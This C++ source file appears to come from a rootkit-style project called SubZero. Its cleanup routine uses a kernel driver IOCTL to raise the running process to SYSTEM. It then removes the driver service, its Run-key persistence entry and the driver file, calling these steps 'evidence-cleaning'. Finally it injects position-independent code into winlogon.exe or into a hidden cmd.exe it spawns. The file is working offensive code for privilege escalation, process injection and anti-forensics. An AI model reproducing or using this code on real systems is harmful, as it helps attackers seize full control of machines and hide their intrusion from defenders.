#include "pch.h"
#include "SubZeroCleanup.h"
#include "PIC.h"
#include "PicInjection.h"

#include "../SubZeroDriver/SubZeroCommon.h"
#include "../SubZeroLauncher/SubZeroLauncherCommon.h"
#include "../SubZeroUtils/RegistryManager.h"
#include "../SubZeroUtils/ServiceManager.h"
#include "../SubZeroUtils/RunningProcesses.h"
#include "../SubZeroUtils/AutoRegistryKeyHandle.h"
#include "../SubZeroUtils/AutoHandle.h"

#include <sstream>

void SubZeroCleanup::Cleanup()
{
    // Create a string stream that will log any exception. The final error log will only be thrown at the end of the function, in order to ensure every
	// evidence-cleaning function will be called - even in case of an error on the way.
    std::stringstream finalException("");

    std::uint32_t picTargetPID = 0;
	
    // Uninstall SubZero driver if exists. 
    const ServiceManager serviceManager(DRIVER_NAMEW, DRIVER_FULL_PATH, SERVICE_KERNEL_DRIVER);
    if (ERROR_SERVICE_DOES_NOT_EXIST != ::GetLastError())
    {       
        try
        {
        	// If the current process is not elevated to SYSTEM, elevate it using the driver before un-installing it.
            if (!IsLocalSystem())
            {
                const AutoHandle deviceAutoHandle(::CreateFile(
                    L"\\\\.\\" DRIVER_NAME,
                    FILE_SHARE_READ | FILE_SHARE_WRITE,
                    0,
                    nullptr,
                    OPEN_EXISTING,
                    0,
                    nullptr));
                if (INVALID_HANDLE_VALUE == deviceAutoHandle.get())
                    throw std::runtime_error("[-] Failed to open the device handle");

                SubZeroSetTokenToSystemData pid = ::GetCurrentProcessId();

                DWORD bytesReturned = 0;
                if (!::DeviceIoControl(
                    deviceAutoHandle.get(),						// device to be queried
                    IOCTL_SUBZERO_SET_TOKEN_TO_SYSTEM,			// operation to perform
                    &pid, sizeof(pid),					// input buffer
                    nullptr, 0,							// output buffer
                    &bytesReturned,                  			// # bytes returned
                    nullptr))
                {
                    throw std::runtime_error("[-] DeviceIoControl Failed");
                }

            	// Current process now will bw able to inject the PIC to winlogon.exe
                picTargetPID = GetProcessPidByProcessName(L"winlogon.exe");
            }
        }
        catch (std::exception& exception)
        {
            finalException << exception.what() << "\n";        
        }

        // Driver is loaded - this function must succeed in order to continue. Any error here should be caught by the caller and handled accordingly.
        serviceManager.stopAndRemove();
    }

    // Delete registry value
    try {
        const AutoRegistryKeyHandle autoRegKey(RegistryManager::OpenRegistryKey(REG_SZ_KEY_ROOT, REG_RUN_KEY_PATH));
        RegistryManager::DeleteRegistryValue(autoRegKey.get(), REG_VALUE_NAME);
    }
    catch (const Win32ErrorCodeException& exception) {
        finalException << exception.what() << "\n";
    }

    // Delete driver file
    if (!::DeleteFileW(DRIVER_FULL_PATH.c_str()))
    {
        const int lastError = ::GetLastError();
        if (ERROR_FILE_NOT_FOUND != lastError)
            finalException << "[-] Error deleting driver file. Error code: " << lastError << "\n";
    }
	
	// If there was an error elevating explorer to SYSTEM
	if (0 == picTargetPID)
    {
		STARTUPINFO si;
		PROCESS_INFORMATION pi;

        ::ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ::ZeroMemory(&pi, sizeof(pi));
		
		// Creates a child cmd process that will be the PIC target
		if (!::CreateProcessW(
            L"C:\\Windows\\system32\\cmd.exe",          // Module
            nullptr,					                // Command-line
		    nullptr,                                    // Process security attributes
		    nullptr,                                    // Primary thread security attributes
		    TRUE,						                // Handles are inherited
		    CREATE_NO_WINDOW,                           // Creation flags
		    nullptr,                                    // Environment (use parent)
		    nullptr,                                    // Current directory (use parent)
		    &si,                                        // STARTUPINFO pointer
		    &pi))                                       // PROCESS_INFORMATION pointer             
		{
			finalException << "[-] Error finding target PIC injection process\n";
            throw std::runtime_error(finalException.str());
		}

        ::CloseHandle(pi.hProcess);
        ::CloseHandle(pi.hThread);
		
        picTargetPID = pi.dwProcessId;
    }

    // Setup PIC parameters
    PicParameters picParams =
    {
        LoadLibraryA,
    	GetProcAddress,
        static_cast<int>(::GetCurrentProcessId())
    };

    if (nullptr == picParams.getProcAddress || nullptr == picParams.loadLibraryA)
        finalException << "[-] Invalid PIC parameters\n";
	
    else 
    {
        // Inject PIC
        try
        {
            PicInjection::InjectPic<PicParameters>(picTargetPID, &picParams, PicStart, PicEnd);
        }
        catch (std::exception& exception)
        {
            finalException << exception.what() << "\n";
        }
    }

	// Throw full exception log if exist
    if (finalException.str().length() > 0)
        throw std::runtime_error(finalException.str());
}

std::uint32_t SubZeroCleanup::GetProcessPidByProcessName(const std::wstring& processName)
{
    RunningProcesses processes;
    for (const auto& process : processes)
    {
        std::wstring currentProcessName(process.szExeFile);

        if (processName == currentProcessName)        
            return process.th32ProcessID;
    }

    throw std::runtime_error("Could not find target process PID");
}

bool SubZeroCleanup::IsLocalSystem()
{	
    // open process token
    HANDLE tokenHandle;
    if (!OpenProcessToken(::GetCurrentProcess(),
        TOKEN_QUERY,
        &tokenHandle))
        return false;

    const AutoHandle tokenAutoHandle(tokenHandle);

    UCHAR tokenUser[sizeof(TOKEN_USER) + 8 + 4 * SID_MAX_SUB_AUTHORITIES];
    auto* const pTokenUser = reinterpret_cast<PTOKEN_USER>(tokenUser);
	
    // retrieve user SID
    ULONG returnedLength;
    if (!::GetTokenInformation(tokenAutoHandle.get(), TokenUser, pTokenUser,
        sizeof(tokenUser), &returnedLength))
        return false;

    // allocate LocalSystem well-known SID
    PSID systemSid;
    SID_IDENTIFIER_AUTHORITY siaNT = SECURITY_NT_AUTHORITY;
    if (!::AllocateAndInitializeSid(&siaNT, 1, SECURITY_LOCAL_SYSTEM_RID,
        0, 0, 0, 0, 0, 0, 0, &systemSid))
        return false;

    // compare the user SID from the token with the LocalSystem SID
    const auto isSystem = ::EqualSid(pTokenUser->User.Sid, systemSid);

    ::FreeSid(systemSid);

    return isSystem;
}